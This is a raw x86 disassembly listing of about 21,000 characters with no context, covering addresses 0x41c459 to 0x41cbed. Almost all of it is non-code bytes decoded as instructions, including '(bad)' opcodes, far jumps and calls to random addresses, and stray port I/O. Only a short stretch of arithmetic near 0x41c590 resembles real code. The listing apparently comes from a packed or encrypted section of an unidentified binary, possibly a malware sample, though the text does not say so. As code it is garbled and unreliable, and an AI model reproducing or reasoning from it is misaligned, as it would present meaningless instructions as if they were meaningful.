  41c459:	mov    edx,DWORD PTR [edx-0x11eb6234]
  41c45f:	jge    0x41c49a
  41c461:	(bad)  
  41c462:	mov    dh,0x80
  41c464:	mov    ah,0x1d
  41c466:	in     al,0x9f
  41c468:	lods   eax,DWORD PTR ds:[esi]
  41c469:	fild   WORD PTR [eax-0x51]
  41c46c:	xchg   DWORD PTR [ecx+0x72],ebx
  41c46f:	jnp    0x41c4ca
  41c471:	mov    bh,0x6b
  41c473:	repnz out dx,al
  41c475:	inc    esp
  41c476:	cmp    esp,esi
  41c478:	and    dl,BYTE PTR [esi-0x1dd20d75]
  41c47e:	fs mov al,0x29
  41c481:	sbb    DWORD PTR [ebx-0x6300423c],ebx
  41c487:	jno    0x41c4fa
  41c489:	push   eax
  41c48a:	mov    DWORD PTR [ebp-0x36cde71c],edi
  41c490:	and    DWORD PTR [ecx+0x5e],edi
  41c493:	jp     0x41c443
  41c495:	xlat   BYTE PTR ds:[ebx]
  41c496:	bound  eax,QWORD PTR [ebx-0x5ec6239c]
  41c49c:	mov    DWORD PTR [esi],edi
  41c49e:	(bad)  
  41c49f:	retf   
  41c4a0:	arpl   WORD PTR [esi],bp
  41c4a2:	jl     0x41c4ab
  41c4a4:	xchg   ecx,ebx
  41c4a6:	mov    eax,ds:0xa2d1a4b6
  41c4ab:	xchg   DWORD PTR [ecx],esi
  41c4ad:	jge    0x41c4f9
  41c4af:	push   cs
  41c4b0:	lock add ecx,DWORD PTR [ebx+0x77]
  41c4b4:	push   edx
  41c4b5:	xchg   ebp,eax
  41c4b6:	bnd jb 0x41c4cd
  41c4b9:	data16 aam 0xca
  41c4bc:	test   BYTE PTR [esi-0xd870c8],0x89
  41c4c3:	cmp    eax,0x83791f6f
  41c4c8:	(bad)  
  41c4ca:	outs   dx,DWORD PTR ds:[esi]
  41c4cb:	ss or  al,0x35
  41c4ce:	cmc    
  41c4cf:	lds    edi,FWORD PTR [edx+ebx*8+0x7cb3ce11]
  41c4d6:	mov    dh,0x24
  41c4d8:	and    BYTE PTR [ebx+0xd99157e],ch
  41c4de:	cmc    
  41c4df:	inc    ecx
  41c4e0:	test   eax,0x1021c200
  41c4e5:	sti    
  41c4e6:	repz and esp,DWORD PTR [edi-0x18]
  41c4ea:	or     bl,BYTE PTR [ebp+0x47]
  41c4ed:	fistp  DWORD PTR [ecx+0x2947a26f]
  41c4f3:	imul   edi,edi,0xffffffd6
  41c4f6:	test   eax,0xa023211e
  41c4fb:	cmc    
  41c4fc:	sbb    esi,DWORD PTR [ebx-0x2296a7a2]
  41c502:	enter  0xd882,0x1
  41c506:	(bad)  
  41c507:	xchg   ebx,eax
  41c508:	inc    ecx
  41c509:	add    eax,0xae301679
  41c50e:	or     BYTE PTR [ebp-0x7a],al
  41c511:	inc    edx
  41c512:	push   eax
  41c513:	ror    DWORD PTR [esi-0x7f1a5511],0x60
  41c51a:	fist   WORD PTR [ebp+0x260b2432]
  41c520:	fadd   DWORD PTR [ebx+ecx*4+0x4a]
  41c524:	mov    dl,0xfc
  41c526:	imul   ebp,DWORD PTR [edx+0x12c85c4a],0x26
  41c52d:	push   esi
  41c52e:	je     0x41c4c1
  41c530:	and    bl,BYTE PTR [eax+edi*2-0x3e]
  41c534:	pop    ebx
  41c535:	es inc esp
  41c537:	xor    eax,0xe697d323
  41c53c:	aad    0x3f
  41c53e:	scas   al,BYTE PTR es:[edi]
  41c53f:	cli    
  41c540:	mov    esi,0x3b5dd71b
  41c545:	aaa    
  41c546:	ror    DWORD PTR [eax-0x72783f1d],cl
  41c54c:	push   ebx
  41c54d:	test   edx,edx
  41c54f:	pop    eax
  41c550:	jmp    0xa3a6:0x2862d0c5
  41c557:	addr16 inc eax
  41c559:	mov    eax,0x80ce1102
  41c55e:	fdivr  DWORD PTR [ecx]
  41c560:	add    DWORD PTR [ebx-0x563057ab],ebx
  41c566:	xchg   BYTE PTR [esi+ebx*4-0x97d997],bl
  41c56d:	push   esi
  41c56e:	xchg   ebp,eax
  41c56f:	mov    cl,0x5e
  41c571:	stc    
  41c572:	mov    BYTE PTR [edx+0x63],ah
  41c575:	nop
  41c576:	mov    cl,0xbd
  41c578:	out    0xe5,al
  41c57a:	pop    ebp
  41c57b:	punpckhbw mm4,QWORD PTR gs:[edx+esi*8+0x3339c589]
  41c584:	enter  0xd033,0x2b
  41c588:	retf   0xce2b
  41c58b:	xor    ecx,eax
  41c58d:	mov    DWORD PTR [ebp+0x8],ecx
  41c590:	mov    ecx,DWORD PTR [ebp+0x8]
  41c593:	mov    edx,DWORD PTR [ebp+0x8]
  41c596:	xor    ecx,eax
  41c598:	imul   edx,edx,0x5708f2
  41c59e:	add    ecx,esi
  41c5a0:	lea    ecx,[ebp+ecx*4-0x64]
  41c5a4:	mov    edi,DWORD PTR [ecx]
  41c5a6:	add    edx,edi
  41c5a8:	mov    DWORD PTR [ecx],edx
  41c5aa:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5ad:	xor    ecx,eax
  41c5af:	add    ecx,esi
  41c5b1:	jne    0x41a1f0
  41c5b7:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5ba:	mov    edx,DWORD PTR [ebp+0x8]
  41c5bd:	xor    ecx,eax
  41c5bf:	jmp    0x41e94c
  41c5c4:	js     0x41c5e5
  41c5c6:	pop    ebx
  41c5c7:	out    0xdb,eax
  41c5c9:	jnp    0x41c643
  41c5cb:	rep ins DWORD PTR es:[edi],dx
  41c5cd:	pop    ebx
  41c5ce:	jns    0x41c591
  41c5d0:	cmp    eax,0xfe02fff0
  41c5d5:	loope  0x41c654
  41c5d7:	jp     0x41c5e3
  41c5d9:	pop    edi
  41c5da:	jp     0x41c656
  41c5dc:	xchg   edi,eax
  41c5dd:	fnsave [eax+edi*4]
  41c5e0:	jmp    0x1ea21486
  41c5e5:	cmp    BYTE PTR [ebp-0x55],al
  41c5e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5e9:	jecxz  0x41c5f9
  41c5eb:	fadd   st(0),st
  41c5ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5ee:	jle    0x41c5a3
  41c5f0:	xchg   DWORD PTR [ecx-0x6a],ebx
  41c5f3:	fcomp  QWORD PTR [eax-0x46966f9]
  41c5f9:	mov    ch,0x28
  41c5fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5fc:	call   0x3a73:0xa8005469
  41c603:	mov    al,BYTE PTR [eax-0x17c3b38f]
  41c609:	mov    ah,0x9
  41c60b:	popf   
  41c60c:	jmpw   0xe4c4
  41c610:	shl    ebx,0x42
  41c613:	push   edx
  41c614:	loopne 0x41c636
  41c616:	dec    esi
  41c617:	xor    DWORD PTR [ebx+0x5ea5f220],edi
  41c61d:	sbb    DWORD PTR [eax+ebx*8+0xcbee3cd],ebx
  41c624:	or     edi,eax
  41c626:	adc    dl,BYTE PTR [edx-0x48]
  41c629:	mov    bl,0x2b
  41c62b:	inc    edx
  41c62c:	xor    al,0x64
  41c62e:	inc    ecx
  41c62f:	xor    edi,ecx
  41c631:	pop    ss
  41c632:	jle    0x41c67e
  41c634:	jmp    0x6b63f406
  41c639:	pop    eax
  41c63a:	aaa    
  41c63b:	jnp    0x41c5e2
  41c63d:	add    DWORD PTR [edi+0x284a5697],esp
  41c643:	ret    0x2c68
  41c646:	jle    0x41c665
  41c648:	pop    esp
  41c649:	mov    ebx,0x60becf4b
  41c64e:	jb     0x41c5d8
  41c650:	shl    BYTE PTR [ecx-0x62044f5],cl
  41c656:	outs   dx,DWORD PTR ds:[esi]
  41c657:	mov    ds:0x93ce9fd7,ax
  41c65d:	pop    es
  41c65e:	popa   
  41c65f:	jmp    0x41c6c9
  41c661:	xchg   ebx,eax
  41c662:	pop    ds
  41c663:	and    eax,0xb3a8a4a
  41c668:	jl     0x41c6ce
  41c66a:	xchg   edi,eax
  41c66b:	pop    DWORD PTR [edx-0x6539e92c]
  41c671:	adc    DWORD PTR [ecx+0x7f15e8a],esi
  41c677:	frstor [edx+0x44cb76e]
  41c67d:	call   0xd4de:0xe4b56f87
  41c684:	repnz xor al,BYTE PTR [esi]
  41c687:	push   edi
  41c688:	push   edx
  41c689:	cmp    esp,DWORD PTR [edx-0x64fb3a5]
  41c68f:	xchg   ah,bh
  41c691:	jge    0x41c68a
  41c693:	loop   0x41c6bb
  41c695:	mov    ebx,0x8a413c49
  41c69a:	daa    
  41c69b:	in     al,dx
  41c69c:	test   eax,0x31badb65
  41c6a1:	(bad)  
  41c6a3:	sub    eax,0x1b7ec9d3
  41c6a8:	inc    edx
  41c6a9:	xor    BYTE PTR [esi-0x7c883560],dl
  41c6af:	inc    esp
  41c6b0:	or     edi,edx
  41c6b2:	xchg   ebp,eax
  41c6b3:	dec    eax
  41c6b4:	mov    eax,0xbd8b33fd
  41c6b9:	outs   dx,BYTE PTR ds:[esi]
  41c6ba:	xchg   BYTE PTR [ebx-0x3d2de24d],dl
  41c6c0:	mov    cl,0x2d
  41c6c2:	lahf   
  41c6c3:	mov    ecx,0x1cd6f0be
  41c6c8:	xor    BYTE PTR [ecx-0xe],ch
  41c6cb:	cs je  0x41c717
  41c6ce:	fdivrp st(2),st
  41c6d0:	mov    edx,0x53588b1f
  41c6d5:	dec    edx
  41c6d6:	icebp  
  41c6d7:	inc    ebx
  41c6d8:	push   ecx
  41c6d9:	lods   eax,DWORD PTR ds:[esi]
  41c6da:	aad    0x55
  41c6dc:	paddsb mm5,QWORD PTR [esi+edi*4]
  41c6e0:	adc    edx,DWORD PTR [edi]
  41c6e2:	push   ebp
  41c6e3:	cmp    al,0x6
  41c6e5:	xor    BYTE PTR ds:0x2cdb7cc2,dl
  41c6eb:	fsub   DWORD PTR ds:0x3be2364e
  41c6f1:	cld    
  41c6f2:	mov    esp,0xe8b19aa6
  41c6f7:	mov    cl,0x43
  41c6f9:	(bad)  
  41c6fa:	in     al,dx
  41c6fb:	mov    dl,0xcc
  41c6fd:	mov    DWORD PTR [edx],ecx
  41c6ff:	cmp    ah,0xe7
  41c702:	loope  0x41c6a8
  41c704:	adc    eax,DWORD PTR [esi+0x1e]
  41c707:	lahf   
  41c708:	data16 ja 0x41c740
  41c70b:	jp     0x41c6a9
  41c70d:	or     eax,0x2bfb2f83
  41c712:	lea    ebx,[eax-0x1a942542]
  41c718:	cmp    esi,DWORD PTR [edx]
  41c71a:	addr16 popa 
  41c71c:	mov    al,0xf8
  41c71e:	out    0x38,al
  41c720:	add    edx,DWORD PTR [esi]
  41c722:	or     dh,ah
  41c724:	sub    edx,edx
  41c726:	or     eax,0x53e9f141
  41c72b:	les    esi,FWORD PTR [eax+0x19]
  41c72e:	cmp    ebp,DWORD PTR [ecx]
  41c730:	add    BYTE PTR [esi+0x4a98306],al
  41c736:	lock aaa 
  41c738:	xchg   ebp,eax
  41c739:	rcl    esp,0x99
  41c73c:	fsub   st(6),st
  41c73e:	xor    BYTE PTR [esi-0x4],bl
  41c741:	xlat   BYTE PTR ds:[ebx]
  41c742:	in     al,dx
  41c743:	arpl   WORD PTR ss:[ebp-0x4],cx
  41c747:	ror    BYTE PTR [esi],1
  41c749:	in     al,dx
  41c74a:	hlt    
  41c74b:	xchg   ecx,eax
  41c74c:	inc    edi
  41c74d:	shl    BYTE PTR [edi+0x5a18d0b7],0x87
  41c754:	int3   
  41c755:	ret    0x7efc
  41c758:	inc    eax
  41c759:	gs sub bl,0x1f
  41c75d:	in     eax,dx
  41c75e:	and    DWORD PTR [eax+edx*2-0x7cb52015],eax
  41c765:	jae    0x41c7b0
  41c767:	or     eax,ebx
  41c769:	xchg   dl,ch
  41c76b:	daa    
  41c76c:	push   edi
  41c76d:	es jb  0x41c72d
  41c770:	xor    ch,al
  41c772:	mov    DWORD PTR [edx],eax
  41c774:	add    dl,ch
  41c776:	loopne 0x41c723
  41c778:	cmp    al,0xdb
  41c77a:	push   0xfffffff6
  41c77c:	cmc    
  41c77d:	and    ecx,esp
  41c77f:	lds    edi,FWORD PTR [ebp+0x62]
  41c782:	out    dx,al
  41c783:	loop   0x41c7a1
  41c785:	mov    dl,0xc0
  41c787:	mov    eax,ds:0xa0a66a47
  41c78c:	add    DWORD PTR [edi-0x32],0x1f
  41c790:	in     al,0x3
  41c792:	or     BYTE PTR [edi],ah
  41c794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c795:	inc    edx
  41c796:	ins    DWORD PTR es:[edi],dx
  41c797:	pop    esp
  41c798:	sub    DWORD PTR [eax+0x35cd7569],ecx
  41c79e:	dec    eax
  41c79f:	push   eax
  41c7a0:	loope  0x41c73c
  41c7a2:	jecxz  0x41c76c
  41c7a4:	icebp  
  41c7a5:	cmp    BYTE PTR [ebx],dl
  41c7a7:	sbb    ah,BYTE PTR [ecx+0x2f]
  41c7aa:	(bad)  {k5}
  41c7af:	and    edi,DWORD PTR [ecx-0x40067d08]
  41c7b5:	add    al,0x8f
  41c7b7:	mov    dh,0xe0
  41c7b9:	and    eax,0xa0a11812
  41c7be:	add    DWORD PTR [eax+0x5],ebx
  41c7c1:	and    DWORD PTR [edx-0x1898958f],ecx
  41c7c7:	push   ebp
  41c7c8:	aam    0xaa
  41c7ca:	outs   dx,DWORD PTR ds:[esi]
  41c7cb:	popa   
  41c7cc:	in     al,0x0
  41c7ce:	jmp    0x2517cc76
  41c7d3:	out    0x4e,al
  41c7d5:	mov    al,0x85
  41c7d7:	add    edi,DWORD PTR [esi-0x7f]
  41c7da:	mov    ebp,0x9f62eca3
  41c7df:	xchg   ebx,eax
  41c7e0:	rol    BYTE PTR gs:[edi+edi*8],0x93
  41c7e5:	scas   al,BYTE PTR es:[edi]
  41c7e6:	pop    edx
  41c7e7:	xor    DWORD PTR [esi],eax
  41c7e9:	mov    esi,DWORD PTR [esi]
  41c7eb:	stos   BYTE PTR es:[edi],al
  41c7ec:	or     bh,BYTE PTR [esi-0x80]
  41c7ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7f0:	inc    ebp
  41c7f1:	sub    al,0x99
  41c7f4:	dec    eax
  41c7f5:	jo     0x41c79d
  41c7f7:	test   BYTE PTR [edx],0x58
  41c7fa:	ja     0x41c85b
  41c7fc:	ja     0x41c7e1
  41c7fe:	cli    
  41c7ff:	neg    BYTE PTR [edi-0x4326c143]
  41c805:	or     BYTE PTR [ecx-0x3aba1a06],al
  41c80b:	call   0xd29:0xf834a63
  41c812:	pop    esp
  41c813:	cmp    edx,edx
  41c815:	nop
  41c816:	out    0x61,eax
  41c818:	add    ebp,DWORD PTR [esi]
  41c81a:	scas   eax,DWORD PTR es:[edi]
  41c81b:	mov    dh,0x7
  41c81d:	loopne 0x41c7b6
  41c81f:	lock pop esi
  41c821:	jp     0x41c825
  41c823:	push   0x5d
  41c825:	adc    ch,BYTE PTR [esi+0x3b7c4570]
  41c82b:	adc    DWORD PTR [eax-0x6836f731],esi
  41c831:	cmp    bh,BYTE PTR [ebp+0x1d133bde]
  41c837:	idiv   DWORD PTR [eax+0x2]
  41c83a:	call   0xe0ef:0x629d8238
  41c841:	inc    ecx
  41c842:	xor    DWORD PTR [edx*1+0x6e888c0e],edi
  41c849:	mov    ah,0xe8
  41c84b:	aaa    
  41c84c:	inc    ebx
  41c84d:	dec    esi
  41c84e:	sbb    edx,DWORD PTR [ebx+esi*1-0x4f]
  41c852:	gs int 0xbb
  41c855:	in     al,0x67
  41c857:	or     eax,ecx
  41c859:	sbb    esp,DWORD PTR [ecx+0x78]
  41c85c:	pop    edx
  41c85d:	imul   edi,ecx,0x919d6e1d
  41c863:	dec    esi
  41c864:	hlt    
  41c865:	mov    dh,0x1a
  41c867:	push   es
  41c868:	sti    
  41c869:	cmp    eax,DWORD PTR [edi+esi*2]
  41c86c:	sub    BYTE PTR [ecx+edi*8],bl
  41c86f:	neg    DWORD PTR [ebx+0x14]
  41c872:	pop    ss
  41c873:	lahf   
  41c874:	push   DWORD PTR [ebx+0x7c]
  41c877:	sbb    BYTE PTR [esi],ch
  41c879:	inc    edi
  41c87a:	or     bl,BYTE PTR [ebp-0x31]
  41c87d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c87e:	or     al,0x17
  41c880:	lock xor DWORD PTR [edx],0x53
  41c884:	add    edi,eax
  41c886:	pop    esi
  41c887:	jg     0x41c824
  41c889:	xlat   BYTE PTR ds:[ebx]
  41c88a:	aam    0xde
  41c88c:	sbb    edi,DWORD PTR [edi-0x13]
  41c88f:	xchg   al,dl
  41c891:	and    DWORD PTR [eax-0x33],eax
  41c894:	pop    esp
  41c895:	popf   
  41c896:	ficom  WORD PTR [edi+0x49827c83]
  41c89c:	sub    ch,BYTE PTR [esi+0x591d636c]
  41c8a2:	xlat   BYTE PTR ds:[ebx]
  41c8a3:	fcomp  DWORD PTR [ebp+0x36]
  41c8a6:	xchg   ebp,eax
  41c8a7:	and    dl,BYTE PTR [edx-0x9dab35a]
  41c8ad:	or     edx,edx
  41c8af:	scas   eax,DWORD PTR es:[edi]
  41c8b0:	es mov ebx,fs
  41c8b3:	push   esp
  41c8b4:	xchg   esi,eax
  41c8b5:	arpl   WORD PTR [eax],cx
  41c8b7:	call   0xfcaf:0x62ca8247
  41c8be:	addr16 mov ecx,0x4dd51c7e
  41c8c4:	or     eax,0x5df1bc2c
  41c8c9:	aaa    
  41c8ca:	adc    al,0xc2
  41c8cc:	pushf  
  41c8cd:	inc    ecx
  41c8ce:	jbe    0x41c936
  41c8d0:	test   DWORD PTR [eax-0x18],0x4d50463e
  41c8d7:	rcl    BYTE PTR [edi],1
  41c8d9:	int3   
  41c8da:	imul   esi,DWORD PTR [edi-0x817e17e],0x28a7f173
  41c8e4:	push   eax
  41c8e5:	dec    esi
  41c8e6:	sahf   
  41c8e7:	jb     0x41c902
  41c8e9:	sub    eax,0x381fd70f
  41c8ee:	mov    ds:0xbaed8f1f,eax
  41c8f3:	sub    al,al
  41c8f5:	jo     0x41c943
  41c8f7:	pusha  
  41c8f8:	mov    dl,0x71
  41c8fa:	aam    0x4
  41c8fc:	in     eax,0xaf
  41c8fe:	dec    edx
  41c8ff:	xchg   BYTE PTR [eax+0x32],bl
  41c902:	fmul   QWORD PTR [esi-0x20]
  41c905:	xor    al,0x54
  41c907:	(bad)  
  41c908:	pop    es
  41c909:	xchg   edi,eax
  41c90a:	imul   edi,DWORD PTR cs:[esi],0xb861bcd0
  41c911:	xchg   ecx,eax
  41c912:	mov    bl,BYTE PTR [ebx]
  41c914:	add    dh,BYTE PTR [ecx+0x1f]
  41c917:	les    esp,FWORD PTR [edi-0x2c689a37]
  41c91d:	pop    ebx
  41c91e:	cld    
  41c91f:	push   eax
  41c920:	jl     0x41c919
  41c922:	mov    bh,0x6d
  41c924:	ss pop ecx
  41c926:	mov    al,ds:0x2ae6d441
  41c92b:	aas    
  41c92c:	sub    eax,0xc3a455ae
  41c931:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c932:	bound  ebp,QWORD PTR [edi+0x57bed20f]
  41c938:	push   edx
  41c939:	push   ss
  41c93a:	jge    0x41c975
  41c93c:	add    al,0x89
  41c93e:	stc    
  41c93f:	mov    esi,0x607da8fd
  41c944:	repz call 0x81582685
  41c94a:	dec    esp
  41c94b:	adc    ebp,DWORD PTR [ebp+0x56368d3]
  41c951:	push   edx
  41c952:	inc    edi
  41c953:	repnz test al,0xf1
  41c956:	push   ebx
  41c957:	jns    0x41c8e9
  41c959:	dec    ebx
  41c95a:	xchg   edi,eax
  41c95b:	lea    ebx,[esi+ebx*1+0x7fa8190a]
  41c962:	pusha  
  41c963:	add    al,0xd6
  41c965:	clc    
  41c966:	out    dx,al
  41c967:	mov    al,ds:0xa67073f7
  41c96c:	add    esp,DWORD PTR ds:0x8dbd05f
  41c972:	sbb    BYTE PTR [ebp+edx*8+0x14786dea],cl
  41c979:	(bad)  
  41c97a:	mov    esp,0x7d04c548
  41c97f:	push   ebx
  41c980:	mov    ah,0x80
  41c982:	popf   
  41c983:	dec    ebx
  41c984:	popf   
  41c985:	es (bad) 
  41c987:	lahf   
  41c988:	push   ecx
  41c989:	cmp    bl,BYTE PTR [esi-0x6cae055e]
  41c98f:	iret   
  41c990:	xchg   ebp,eax
  41c991:	push   es
  41c992:	call   0x75e:0x96711e88
  41c999:	inc    ecx
  41c99a:	int3   
  41c99b:	or     eax,0x270940a5
  41c9a0:	rcr    BYTE PTR [ecx+edi*1+0x18],0x5f
  41c9a5:	daa    
  41c9a6:	hlt    
  41c9a7:	pop    edx
  41c9a8:	es cmp eax,0xc01e2c18
  41c9ae:	xchg   esi,eax
  41c9af:	popa   
  41c9b0:	inc    ebp
  41c9b1:	pop    es
  41c9b2:	or     ebx,DWORD PTR [edx+edi*4+0xf]
  41c9b6:	popf   
  41c9b7:	pop    edx
  41c9b9:	jb     0x41c956
  41c9bb:	popa   
  41c9bc:	jbe    0x41ca36
  41c9be:	repz pop eax
  41c9c0:	or     ch,al
  41c9c2:	adc    BYTE PTR [ecx+0x68],ch
  41c9c5:	imul   edx,edi,0xffffffe8
  41c9c8:	retf   0xf5ec
  41c9cb:	clc    
  41c9cc:	lods   eax,DWORD PTR ds:[esi]
  41c9cd:	sahf   
  41c9ce:	cmp    eax,DWORD PTR [ebx+0x6c]
  41c9d1:	hlt    
  41c9d2:	cmp    DWORD PTR [ebx-0x144730cf],0xffffffa3
  41c9d9:	jnp    0x41c977
  41c9db:	pushf  
  41c9dc:	jecxz  0x41c9fe
  41c9de:	xchg   ecx,eax
  41c9df:	jnp    0x41ca3b
  41c9e1:	stos   BYTE PTR es:[edi],al
  41c9e2:	jb     0x41c9fa
  41c9e4:	loopne 0x41c974
  41c9e6:	rcl    edx,1
  41c9e8:	in     al,dx
  41c9e9:	ror    DWORD PTR [edi],1
  41c9eb:	inc    ebp
  41c9ec:	pop    edi
  41c9ed:	dec    ebp
  41c9ee:	mov    esp,0x206b897d
  41c9f3:	add    edi,DWORD PTR [edi]
  41c9f5:	sar    BYTE PTR [edx-0x7ddd52c2],0x6c
  41c9fc:	scas   eax,DWORD PTR es:[edi]
  41c9fd:	push   es
  41c9fe:	rcr    DWORD PTR [ebx],0x64
  41ca01:	clc    
  41ca02:	pushf  
  41ca03:	sbb    eax,0xd750ccde
  41ca08:	jo     0x41c9ba
  41ca0a:	fidiv  WORD PTR [ebp+eiz*2+0x68]
  41ca0e:	push   ecx
  41ca0f:	push   ebx
  41ca10:	cmc    
  41ca11:	rol    DWORD PTR [ebx],cl
  41ca13:	pop    es
  41ca14:	mov    BYTE PTR [eax],al
  41ca16:	pop    ds
  41ca17:	pop    ecx
  41ca18:	mov    ebp,ebx
  41ca1a:	add    al,0xff
  41ca1c:	stos   DWORD PTR es:[edi],eax
  41ca1d:	enter  0x9173,0x75
  41ca21:	xchg   ebp,eax
  41ca22:	and    DWORD PTR [edx+0x7d],ecx
  41ca25:	xor    BYTE PTR [ebx-0x598bd826],ch
  41ca2b:	xor    ch,bh
  41ca2d:	pop    ebp
  41ca2e:	lods   al,BYTE PTR ds:[esi]
  41ca2f:	ret    0xee5c
  41ca32:	es std 
  41ca34:	mov    BYTE PTR [ebx+0x20ca7214],al
  41ca3a:	loop   0x41ca32
  41ca3c:	or     DWORD PTR [edi+0x78db437d],ecx
  41ca42:	hlt    
  41ca43:	loop   0x41c9d9
  41ca45:	ret    0xea41
  41ca48:	jno    0x41ca12
  41ca4a:	inc    esi
  41ca4b:	iret   
  41ca4c:	sar    BYTE PTR [eax+0x73],0x7a
  41ca50:	xlat   BYTE PTR ds:[ebx]
  41ca51:	pusha  
  41ca52:	(bad)  
  41ca53:	ret    0x524e
  41ca56:	jo     0x41ca8b
  41ca58:	jne    0x41cad9
  41ca5a:	cmp    ah,BYTE PTR [esi-0x7d]
  41ca5d:	pop    es
  41ca5e:	pop    eax
  41ca5f:	arpl   WORD PTR [ecx-0x3e],dx
  41ca62:	aam    0xb2
  41ca64:	call   0x97a394e5
  41ca69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca6a:	inc    ebp
  41ca6b:	sub    DWORD PTR [ebp+0x11],ebp
  41ca6e:	scas   al,BYTE PTR es:[edi]
  41ca6f:	push   esp
  41ca70:	push   0x65582f30
  41ca75:	push   edx
  41ca76:	ja     0x41ca80
  41ca78:	or     BYTE PTR [ecx-0x43b5ea8],0xdb
  41ca7f:	push   esi
  41ca80:	lds    esp,FWORD PTR cs:[ecx]
  41ca83:	and    esi,DWORD PTR [edx+0x5a2ae6a2]
  41ca89:	mov    cl,BYTE PTR [ebx-0x70f76fc]
  41ca8f:	mov    ebx,0x1fccbba2
  41ca94:	nop
  41ca95:	dec    esp
  41ca96:	(bad)  
  41ca97:	loope  0x41ca1d
  41ca99:	jmp    0x102e47d0
  41ca9e:	(bad)  
  41ca9f:	mov    ebp,0xff5c8339
  41caa4:	je     0x41ca7b
  41caa6:	add    esi,DWORD PTR [edi]
  41caa8:	jle    0x41ca7e
  41caaa:	fist   WORD PTR [ebp+0x46b8b573]
  41cab0:	addr16 add eax,eax
  41cab3:	mov    ds:0xebd33a0,al
  41cab8:	rol    BYTE PTR ds:0x6ec5f26a,cl
  41cabe:	mov    al,ds:0x882d0b7
  41cac3:	cmp    BYTE PTR [si],bl
  41cac6:	ret    
  41cac7:	in     eax,0xea
  41cac9:	jmp    0x2acd:0x3af66cfa
  41cad0:	mov    DWORD PTR [ebp+eiz*2-0x2207e778],eax
  41cad7:	mov    DWORD PTR [ebx-0x30],esi
  41cada:	mov    ebp,0xccc16ad8
  41cadf:	loopne 0x41ca86
  41cae1:	pop    es
  41cae2:	cs das 
  41cae4:	fadd   QWORD PTR [edx-0x30]
  41cae7:	xchg   BYTE PTR [edx-0x5eb85d26],dh
  41caed:	icebp  
  41caee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caef:	aad    0x96
  41caf1:	dec    esi
  41caf2:	das    
  41caf3:	out    dx,al
  41caf4:	mov    edi,0x4bac1104
  41caf9:	mov    esp,0xd91a717e
  41cafe:	push   edi
  41caff:	mov    gs,eax
  41cb01:	pop    esp
  41cb02:	js     0x41cb70
  41cb04:	and    eax,0xbcf55078
  41cb09:	xor    eax,0x25a4df1
  41cb0e:	xor    DWORD PTR [esi+0x6460bfc3],eax
  41cb14:	sub    bl,al
  41cb16:	les    esp,FWORD PTR [edx-0x50]
  41cb19:	call   0xb875112d
  41cb1e:	fsub   QWORD PTR [edi+0x44]
  41cb21:	stc    
  41cb22:	dec    ecx
  41cb23:	test   BYTE PTR [esi+eax*1-0x54],bl
  41cb27:	test   BYTE PTR [ebx-0x3f3ce907],bl
  41cb2d:	and    dh,al
  41cb2f:	mov    edx,0xce75cf56
  41cb34:	cmp    ch,BYTE PTR [ebp+0x19fb2eb5]
  41cb3a:	div    BYTE PTR [edi+0x7e]
  41cb3d:	xchg   esp,eax
  41cb3e:	sub    dl,al
  41cb40:	leave  
  41cb41:	mov    dl,0x21
  41cb43:	cwde   
  41cb44:	xor    ebx,edx
  41cb46:	xor    al,al
  41cb48:	mov    ch,0xf6
  41cb4a:	fmul   DWORD PTR [ebx-0x5b37f441]
  41cb50:	outs   dx,BYTE PTR ds:[esi]
  41cb51:	test   bh,0xc2
  41cb54:	test   BYTE PTR [ecx-0x5d85a660],bl
  41cb5a:	fisttp WORD PTR ds:0xecaa168f
  41cb60:	pop    ebx
  41cb61:	bound  edx,QWORD PTR [ebx+0x7d]
  41cb64:	push   esi
  41cb65:	sbb    BYTE PTR ds:0x716f8801,bl
  41cb6b:	jmp    0x41cb08
  41cb6d:	xlat   BYTE PTR ds:[ebx]
  41cb6e:	mov    cs,WORD PTR [ebx]
  41cb70:	sub    DWORD PTR [esi-0x2d],esi
  41cb73:	arpl   WORD PTR [ebx+ebx*2+0x9e93efd],dx
  41cb7a:	daa    
  41cb7b:	cli    
  41cb7c:	ror    DWORD PTR [edx+esi*2-0x26],cl
  41cb80:	xor    BYTE PTR [esi],0xda
  41cb83:	jns    0x41cb63
  41cb85:	ins    BYTE PTR es:[edi],dx
  41cb86:	mov    BYTE PTR [ecx-0x42a5dcba],bl
  41cb8c:	add    al,0x2e
  41cb8e:	lods   eax,DWORD PTR ds:[esi]
  41cb8f:	int    0x4
  41cb91:	sbb    eax,0xf5696b54
  41cb96:	jbe    0x41cb59
  41cb98:	mov    esi,0x97b635a0
  41cb9d:	test   DWORD PTR [ebx],0xf205ba0a
  41cba3:	mov    edx,0xcc9386be
  41cba8:	test   BYTE PTR ds:0xd84dbe58,al
  41cbae:	rol    cl,cl
  41cbb0:	push   ss
  41cbb1:	xchg   DWORD PTR ds:0xf410e394,edx
  41cbb7:	jle    0x41cbb2
  41cbb9:	add    al,0xd5
  41cbbb:	jp     0x41cc3b
  41cbbd:	mov    bl,0x7c
  41cbbf:	add    eax,ecx
  41cbc1:	add    BYTE PTR [ebp-0x75],ah
  41cbc4:	test   eax,0xbff71631
  41cbc9:	fdivr  QWORD PTR [esi-0x5e]
  41cbcc:	loope  0x41cba2
  41cbce:	cs pop es
  41cbd0:	jmp    0x6cd1d3e5
  41cbd5:	cmc    
  41cbd6:	xchg   ebp,eax
  41cbd7:	lahf   
  41cbd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbd9:	or     esp,DWORD PTR [edx]
  41cbdb:	or     DWORD PTR [ebp+0x5e],ebp
  41cbde:	jb     0x41cb9d
  41cbe0:	retf   
  41cbe1:	(bad)  
  41cbe2:	or     edi,DWORD PTR [eax]
  41cbe4:	dec    eax
  41cbe5:	pop    ss
  41cbe6:	mov    eax,ds:0x4112d936
  41cbeb:	jp     0x41cb9d
  41cbed:	jmp    0x8d7f1f3e
